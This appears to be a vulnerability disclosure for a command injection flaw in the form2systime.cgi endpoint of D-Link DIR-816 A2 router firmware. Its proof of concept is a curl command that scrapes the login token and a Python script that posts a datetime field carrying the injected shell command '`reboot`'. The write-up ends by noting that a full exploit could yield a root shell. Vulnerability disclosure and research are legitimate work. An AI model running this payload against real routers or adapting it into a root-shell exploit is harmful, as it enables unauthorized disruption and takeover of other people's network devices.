
# D-link DIR-816 A2_v1.10CNB04.img Command injection vulnerability

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/form2systime_cgi/img/vuln1.png)

In /goform/form2systime.cgi, the Command injection vulnerability only needs to be met by datetime -:

## Poc

First you need to get the tokenid

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Next, run the following poc, you can see that the router is restarted

```python
import requests

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

tokenid = '1804289383'

url = 'http://192.168.0.1/goform/form2systime.cgi'

data = {
    'tokenid' : tokenid,
    'datetime' : '`reboot`-:'
}
response = requests.post(url, data=data)
response.encoding="utf-8"
info = response.text
li(url)
print(info)
```

Finally, exp can be written to achieve the effect of obtaining a root shell
